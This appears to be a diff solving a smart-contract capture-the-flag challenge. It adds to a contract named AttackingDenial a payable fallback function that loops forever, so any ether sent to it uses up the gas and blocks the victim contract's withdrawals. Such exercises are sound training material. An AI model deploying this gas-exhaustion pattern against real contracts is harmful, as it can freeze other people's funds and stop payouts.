@@ -10,4 +10,7 @@ contract AttackingDenial {
     }
 
     //Code me!
+    fallback() external payable {
+        while (true) {}
+    }
 }
